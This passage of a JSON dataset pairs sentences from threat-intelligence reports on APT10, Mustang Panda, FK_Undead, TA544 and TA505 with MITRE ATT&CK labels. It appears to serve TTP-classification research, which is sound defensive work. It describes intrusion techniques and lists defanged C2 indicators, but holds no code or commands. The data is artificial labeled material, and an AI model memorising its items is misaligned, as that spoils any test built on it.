will continue to watch and report on further developments as ransomware operators adjust their enterprises.", "labels": ["T1486"], "document": "intel471_2021-05-14_darkside-ransomware-shut-down-revil"}, {"sentence": "The energy reserves in the Eastern Mediterranean Sea and a malicious campaign of APT10 against Turkey", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "A malicious campaign allegedly attributed to APT10 against Turkish organizations from various sectors such as telecommunications and finance has been identified by Adeo in January of 2020 ([14]).", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "APT10 is a group presumably attributed to the Ministry of State Security of China ([15]).", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "It has been identified that APT10 usually carries out malicious campaigns against organizations that could damage the China\u2019s State interests into the global market.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "On the other hand, it has also been detected that APT10 usually carries out malicious campaigns against organizations that support foundations which carry out aid projects with ethnic groups that may be a potential threat against the Chinese national security, as the case of the Uyghur community.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Moreover, in this campaign has been identified several similarities with the TTP published in other APT10 reports in 2019 ([14]).", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "In this case, it was identified that this campaign began in 2016 and the initial access was carried out with the exploitation of a public web application.", "labels": ["TA0001", "T1190"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The attackers deployed the following China Chopper4, JspSpy5 webshells to obtain a foothold on the victim\u2019s network that they used to execute commands to upload files to the target machines.", "labels": ["T1105"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "\u2022 Reconnaissance, execution and theft of credentials:", "labels": ["TA0006"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "In the reconnaissance phase, a series of commands were launched to collect information from users, domains and shared folders.", "labels": ["T1135", "T1033"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The hostile actor used legitimate tools of the Windows operating systems for the reconnaissance stage, such as \u201cipconfig.exe\u201d, \u201cwhoami.exe\u201d, \u201cnet.exe\u201d, \u201cping.exe\u201d, \u201cpowershell.exe\u201d and \u201d BloodHound \u201d(bloodHound is not a legitimate binary from Microsoft).", "labels": ["S0100", "S0039", "S0097", "S0100", "S0521", "S0521"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The attacker used an advanced tool called \u201cdns.exe\u201d to list all the machines that were registered in a particular domain.", "labels": ["T1018"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Regarding the execution, the hostile actor implemented \u201chTran\u201d backdoor to be able to exfiltrate information.", "labels": ["T1041", "TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "In previous malicious APT10 campaigns against Turkey, this executable file was seen with the name \u201cjava.exe\u201d on compromised hosts.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Hostile actors loaded a malicious DLL into the memory of a legitimate binary.", "labels": ["T1055"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The final payload is injected into the legitimate process \u201csvchost.exe\u201d.", "labels": ["T1055"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "It was identified that this payload was a PlugX variant or a CobaltStrike Beacon as a post-exploitation framework.", "labels": ["S0013", "S0154", "S0154"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "To carry out the theft of credentials the hostile actor used the following tools: \u201cQuarksPWdump\u201d and \u201cMimikatz\u201d.", "labels": ["T1003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "\u2022 Lateral movements", "labels": ["TA0008"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Through the lateral movements they were able to compromise critical servers and gain access as a domain administrator.", "labels": ["TA0004"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The group used NTLM hashes to move laterally.", "labels": ["T1550"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "They used the tools \u201cnet.exe\u201d, \u201cwmic.exe\u201d, \u201cpsexec.exe\u201d, \u201csmbexec\u201d, and \u201cwmiexec\u201d.", "labels": ["S0039", "S0029"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "\u2022 Persistence", "labels": ["TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The advanced group established persistence in certain servers that were of their interest and deployed a remote access Trojans such as \u201cQuasarRAT\u201d and \u201cPlugX\u201d, moreover penetration or \u201cpentesting\u201d tools such as \u201cCobalt Strike\u201d and \u201ckerberos\u201d.", "labels": ["TA0003", "S0262", "S0013", "S0154"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "\u2022 C&C connections", "labels": ["TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Hostile actors used two different ways to keep connections with C&C servers.", "labels": ["TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Once the vulnerability was exploited to establish itself on the public server, the group moved to the \u201cterminal server\u201d.", "labels": ["T1190"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "To establish communications with the other hosts in the internal network, they installed an SMB beacon on the \u201cterminal server\u201d, using it as a bridge between the internal network and the C&C server.", "labels": ["TA0011"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "*Illustration 4.First C&C communication method*", "labels": ["TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "However, the group established a different method for hosts that had direct access or had a proxy.", "labels": ["T1090"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "In this case they used the http protocol to establish the communications with the C&C.", "labels": ["T1071"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "*Illustration 5.Second C&C communication method*", "labels": ["TA0003"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "In the following chart, there are the TTPs developed by APT10 during this malicious campaign against the Turkish organizations ([16]) ([14]):", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "*Illustration 6.TTP used in the APT10 campaign*", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Furthermore, the diplomatic Turkish support to certain Chinese ethnic groups that are considerate as a threat against the Chinese national security, could provoke that Turkey becomes a target of groups like APT10 which presumably are linked to the Ministry of State Security of China.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "APT10 is a group that has a wide range of targets.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "The organizations from sectors of interest for the government of China and the organizations that have some kind of link with the commercial development of the OBOR route could be susceptible to being targeted by groups such as APT10.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "APT10 Threat Analysis Report.", "labels": ["G0045"], "document": "lab52_2020-05-14_the-energy-reserves-in-the"}, {"sentence": "Mustang Panda Recent Activity: Dll-Sideloading trojans with temporal C2 servers", "labels": ["G0129", "T1574", "TA0011"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "Recently, from Lab52 we have detected a recent malware sample, using the Dll-Sideload technique with a legitimate binary, to load a threat.", "labels": ["T1574", "T1036"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "This particular sample has a very small DLL, that loads an encrypted file, which after being decrypted consists of a sample of the PlugX Trojan.", "labels": ["S0013", "T1574", "T1140"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "This technique, and final threat together, consists of one of the most common TTPs among some APT groups generally of Chinese origin such as APT1, APT27 and Mustang Panda.", "labels": ["G0006", "G0129"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "The binary consists of an installer, which drops in the folder \u201cC:\\ProgramData\\AAM Updatesnnk\u201d the legitimate binary vulnerable to dll sideload, the small dll that acts as a loader for the final threat, and the binary file, which consists of the encrypted PlugX sample.", "labels": ["S0013", "T1574"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "After deploying the three files, the installer runs the legitimate binary, causing the final PlugX threat to be loaded by it.", "labels": ["TA0002", "S0013"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "In this case, the legitimate vulnerable binary is part of Adobe\u2019s Swite which will load any library named \u201chex.dll\u201d that is next to the executable.", "labels": ["T1574", "T1203"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "It has 4 exports that return 0 without doing anything, the Main function of the library, on the other hand, calls a function that checks the existence of the .dat file which is hardcoded (adobeupdate.dat in this case), loads it, extracts the first string of the binary and uses it as XOR key to decode the rest of the file, which consists on the final threat.", "labels": ["T1083", "T1140"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "When it finishes deciphering it, it loads the malware into memory, makes a \u201cMemprotect\u201d to make it executable and launches its logic from the byte 0 of the binary.", "labels": ["T1140"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "It is a functional PE, so this should not work, since it starts with the \u201cMZ\u201d header of a normal binary:", "labels": ["T1055"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "But in this case it uses a technique already seen before in tools like the Cobalt Strike Beacon that by modifying some bytes of the MZ header, it becomes meaningful executable code.", "labels": ["S0154", "S0154", "T1140"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "If we open the binary as a shellcode (de-compiling from byte 0) we see how they have modified the first bytes into a routine that jumps to a code zone, consisting of a PE loader:", "labels": ["T1055"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "After decrypting its configuration, it contains the folder where the binary must be installed, a XOR key that will use to encrypt it\u2019s traffic and a list of up to 4 domains or IP addresses of command and control servers together with the port to be used.", "labels": ["T1140", "T1001"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "Generally the 4 C2 elements consists of the same domain repeated 4 times or 2 domains repeated twice each.", "labels": ["TA0011"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "After the analysis, both the loader in DLL format and the final encrypted threat (after decryption) have been compared with different campaign samples of groups known to use this dll sideload technique, and it has been possible to verify how both the loader and the final threat coincide in a high percentage with the samples of the \u201cMustang Panda\u201d group analyzed in the following reports [[1]](https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication) [[2]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc.html) [[3]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc-phan2.html).", "labels": ["G0129", "T1574", "T1574"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "In fact, the loader of this campaign is able to load and run the samples of the campaigns analyzed in those reports, and the final threat uses exactly the same XOR key to decipher its configuration as the samples in those reports, so there is a high probability that it is a new campaign from this same group.", "labels": ["T1140"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "This particular sample has the domains \u201cwww.destroy2013.]com\u201d and \u201cwww.fitehook.]com\u201d as c2 servers, and we have seen that they have a very characteristic behavior, since most of the day they resolve to 127.0.0.1, but from 1-3 AM (UTC) to 8-9 AM (UTC) it resolves to the IP \u201c107.150.112.]250, except for weekends that it resolves constantly to 127.0.0.1, which could indicate that it is a campaign that is focused on a time zone in which those hours are working hours.", "labels": ["T1071"], "document": "lab52_2020-06-02_mustang-panda-recent-activity-dll"}, {"sentence": "Recent FK_Undead rootkit samples found in the wild", "labels": ["T1014"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "Malware that works at Ring0, generally known as rootkit, is one of the most concerning in many environments because it shares privileges and capabilities with antivirus and EDR solutions, which greatly complicates its detection as far as they can tamper and/or hide the data that allows its detection with relative ease.", "labels": ["T1014", "T1036"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "One of these examples is a threat Known FK\\_Undead, which among its multiple stages of infection and modules, has at least 3 different Rootkit modules.", "labels": ["T1014"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "It check\u2019s the victim\u2019s location by contacting to \u201chttp://pv.sohu.]com/cityjson\u201d after which downloads an executable protected with VMProtect that is stored in the %programdata% folder with a random name and executes it.", "labels": ["T1614", "T1105"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "If this executable does not detect a virtualized environment, it downloads several malicious drivers of type Rootkit:", "labels": ["T1014", "T1497", "T1105"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "1.Monitoring all computer traffic, blocking access to anti-virus solution websites and modifying the content of some websites by injecting it\u2019s own code into the traffic results.", "labels": ["T1049", "T1562", "T1557"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "2.Adding a proxy to the browsers that routes all the victim\u2019s traffic through a server controlled by the actors behind this threat.", "labels": ["T1557"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "3.Protect the registry entry of it\u2019s own installation from being deleted from the system.", "labels": ["T1629"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "It downloads a list of signatures from it\u2019s command and control server every few seconds and prevents any driver with one of this signatures of being loaded.", "labels": ["TA0011"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "The second driver is part of the framework of the company \u201cCallback Technologies\u201d which offers an API for applications to control access to files on the disk by any program and even falsify the result.", "labels": ["T1041"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "The third one is in charge of downloading and installing certificates in the victim machine, so that they can also control the victim\u2019s SSL traffic completely, redirecting it to other sites or breaking the encryption on this legitimate traffic.", "labels": ["T1105", "T1557"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "The majority of the downloads related to this malware are done over HTTP directly against IP addresses generally located in China and using relatively high ports.", "labels": ["T1071"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "Regarding the different configurations of each driver, the download is identical, but with a different name structure, since in this case they contain the word \u201clist\u201d in it\u2019s name and it\u2019s contents are base64 encoded.", "labels": ["T1027"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "C2 IP List", "labels": ["TA0011"], "document": "lab52_2020-06-09_recent-fk-undead-rootkit-samples"}, {"sentence": "Security Brief: TA544 Targets Italian Organizations with Ursnif Malware", "labels": ["S0386"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "This spike in observed threats is largely driven by a group called TA544 leveraging the Ursnif banking trojan.", "labels": ["S0386"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "[TA544](https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta544-targets-geographies-italy-japan-range-malware) is a cybercriminal threat actor that distributes banking malware and other payloads in various geographic regions including Italy and Japan.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Typically, this group varies its payloads which appear to be targeted by region \u2013 for example, in 2021, all TA544 Ursnif campaigns have specifically targeted Italian organizations while Dridex payloads associated with this threat actor do not have specific geographic targeting.", "labels": ["S0386", "S0384"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Ursnif is a trojan that can be used to steal data from websites, with the help of web injections, proxies and VNC connections; steal data such as stored passwords; and download updates, modules, or other malware.", "labels": ["S0386", "TA0006", "T1189"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Although this malware is used by multiple cybercriminal threat actors, TA544\u2019s activity targeting Italy differentiates it from other actors.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Between January and August 2021, the number of observed Ursnif campaigns impacting Italian organizations surpassed the total number of observed Ursnif campaigns targeting this region in all of 2020.", "labels": ["S0386", "S0386"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "In recently observed campaigns, TA544 purports to be Italian courier or energy organizations soliciting payments from the targeted individual.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "*Figure 1: Phishing email masquerading as logistics/courier service BRT.*", "labels": ["T1566"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Attached to the emails are malicious Microsoft Office documents containing macros.", "labels": ["T1566"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "If the macros are enabled, the document will download Ursnif malware.", "labels": ["S0386", "T1204"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "*Figure 2: Malicious Excel document distributing Ursnif.*", "labels": ["S0386", "T1059"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "In the observed campaigns, TA544 often uses geofencing techniques to detect whether recipients are in targeted geographic regions before infecting them with the malware.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "For example, in recent campaigns, the document macro generates and executes an Excel 4 macro written in Italian, and the malware conducts location checks on the server side via IP address.", "labels": ["T1059", "T1059"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "If the user was not in the target area, the malware command and control would redirect to an adult website.", "labels": ["TA0011"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "According to Proofpoint data, Ursnif is currently the most frequently observed malware targeting Italian organizations based on campaign data.", "labels": ["S0386"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Earlier this year, Proofpoint researchers observed multiple Emotet campaigns targeting the region as well \u2013 however, following the [disruption](https://www.justice.gov/opa/pr/emotet-botnet-disrupted-international-cyber-operation) of the Emotet botnet in January 2021, all Emotet activity has disappeared and this malware is no longer an ongoing threat.", "labels": ["S0367", "S0367", "S0367"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Credential phishing is also a frequently observed threat targeting Italian organizations, and threat actors have attempted to steal credentials relating to logistics or banking services, for example.", "labels": ["T1056"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Recent TA544 Ursnif campaigns included activity that targeted multiple sites with web injects and redirections once the Ursnif payload was installed on the target machine.", "labels": ["S0386", "S0386", "T1189"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Web injects refer to malicious code injected to a user\u2019s web browser that attempts to steal data from certain targeted websites.", "labels": ["T1189"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Although Ursnif has previously leveraged web inject capability to infect targeted users.", "labels": ["S0386", "T1189"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "This indicates TA544 is not interested exclusively in obtaining banking credentials, but also usernames and passwords affiliated with websites associated with major retailers.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Today\u2019s threats \u2013 like TA544\u2019s campaigns targeting Italian organizations \u2013 target people, not infrastructure.", "labels": [], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "* Threat actors frequently distribute documents that require macros to be enabled to deploy the malicious payload.", "labels": ["T1059", "T1566"], "document": "proofpoint_2021-09-29_ta544-targets-italian-organizations-ursnif"}, {"sentence": "Whatta TA: TA505 Ramps Up Activity, Delivers New FlawedGrace Variant", "labels": ["G0092", "S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The prominent TA505 has returned to distributing large volumes of malicious emails affecting most industries.", "labels": ["G0092", "T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* New tools include a KiXtart Loader, the MirrorBlast loader, an updated FlawedGrace variant, and updated malicious Excel attachments.", "labels": ["S0383", "T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The campaigns share many similarities with TA505 campaigns from 2019 and 2020.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Since early September 2021, Proofpoint researchers are tracking renewed malware campaigns by the financially driven [TA505](/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter \"Threat Actor Profile: TA505, From Dridex to GlobeImposter\").", "labels": ["G0092", "G0092", "S0384"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The campaigns, which are distributed across a wide range of industries, started with low volume email waves that ramped up in late September, resulting in tens to hundreds of thousands of emails.", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Many of the campaigns, especially the large volume ones, strongly resemble the historic TA505 activity from 2019 and 2020.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The commonalities include similar domain naming conventions, email lures, Excel file lures, and the delivery of the FlawedGrace remote access trojan (RAT).", "labels": ["T1566", "S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The campaigns also contain some noteworthy, new developments, such as retooled intermediate loader stages scripted in Rebol and KiXtart, which are used instead of the previously popular Get2 downloader.", "labels": ["S0460", "T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The new downloaders perform similar functionality of reconnaissance and pulling in the next stages.", "labels": ["T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Lastly, there is an updated version of FlawedGrace.", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The initial campaigns observed by Proofpoint in September 2021 were comparatively small in volume, several thousand emails per wave, and delivered malicious Excel attachments.", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "In late September and in early October 2021 this changed, and TA505 began sending higher email volumes, tens to hundreds of thousands, to more industries.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Additionally, the actor began leveraging both URL and attachment-based email campaigns and diversified from targeting predominantly North America to also targeting German-speaking countries, including Germany and Austria.", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The early campaigns identified by Proofpoint in September 2021 were low volume compared to typical TA505 activity, with only several thousand messages per wave.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "TA505 used more specific lures that did not affect as many industries as the more recent October 2021 campaigns.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The emails contained an Excel attachment that, when opened and macros enabled, would lead to the download and running of an MSI file.", "labels": ["T1566", "T1204", "T1059", "T1059", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The MSI file in turn would execute an embedded Rebol loader, dubbed by Proofpoint as MirrorBlast.", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 2. The insurance claim Excel attachment, part of the September 28, 2021 campaign.*", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "In late September and throughout October 2021, Proofpoint observed a shift to familiar TA505 tactics, techniques, and procedures (TTPs) that are reminiscent of the actor\u2019s 2019 and 2020 campaigns.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "An additional intermediary loader scripted in KiXtart was introduced, and the attack chain evolved to the following:", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "+ Excel attachment", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "+ HTML attachment that links to the download of an Excel file", "labels": ["T1566", "T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "+ URL linking to a landing page that redirects to the download of an Excel file", "labels": ["T1566", "T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "+ URL directly linking to an Excel file", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The Excel file macros download and run an MSI file", "labels": ["T1059", "T1059", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The MSI file executes an embedded KiXtart loader", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The KiXtart loader receives a command from the C&C server to download another MSI file that executes MirrorBlast", "labels": ["TA0011", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* MirrorBlast then downloads additional Rebol script stagers", "labels": ["T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* The follow-on Rebol stagers drop ReflectiveGnome", "labels": ["T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* ReflectiveGnome in turn downloads more shellcode, that will then drop and detonate FlawedGrace", "labels": ["S0383", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The email lures moved away from the detailed lures seen initially in this spate of campaigns.", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 3.* *October 13, 2021* *German-language email* *using a OneDrive shared file lure.*", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 5. Excel file used in the October 13, 2021 campaign with a simple green lure.*", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "### **Similarities to Historic TA505 Activity**", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "There is much similarity between the new and historic TA505 campaigns, starting with the **emails**.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 6. The OneDrive shared file email lure used in August 21, 2020 (left) strongly resembles a similar email from October 7, 2021 (right).", "labels": ["T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The **landing pages** in historic and current TA505 campaigns contain \u201cIP Logger\u201d links that likely enable TA505 to track the IP addresses of the machines downloading the malicious files.", "labels": ["G0092", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Additionally, TA505 is still mimicking file hosting services in the landing pages.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "While the Excel macros VBA code in the recent TA505 campaigns is different, some of the **Excel graphic lures** are similar or identical to those previously used by TA505.", "labels": ["T1059", "G0092", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "**Domain naming conventions:** It is also notable that TA505 has historically used domains that mimic various file hosting service providers and structured them in formats with hyphen separated terms.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "For TA505\u2019s 2021 campaigns to be successful, potential victims must enable macros after opening the malicious Excel files.", "labels": ["G0092", "T1204"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The code responsible for downloading the next stage MSI file was typically lightly obfuscated with filler characters, string reversing or similar simple functions and hidden in the document Comments, Title, in a Cell or other locations.", "labels": ["T1027", "T1027"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 9. Example Excel macros code.*", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 11. Deobfuscated downloader JScript. This pulls the next stage\u2014an MSI file.*", "labels": ["T1140", "T1059", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "TA505 now uses multiple intermediate loaders before the delivery of the FlawedGrace RAT. The new loader stages are coded in uncommon scripting languages\u2014Rebol and KiXtart.", "labels": ["G0092", "S0383", "T1059", "T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "They appear to serve the same purpose as [Get2](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) \u2014 a downloader that has been in use by TA505 since 2019 to deliver a variety of secondary payloads.", "labels": ["S0460", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The loaders perform minimal reconnaissance of an infected machine, such as collecting user domain and username information, and download further payloads.", "labels": ["T1033", "T1482"], "document": 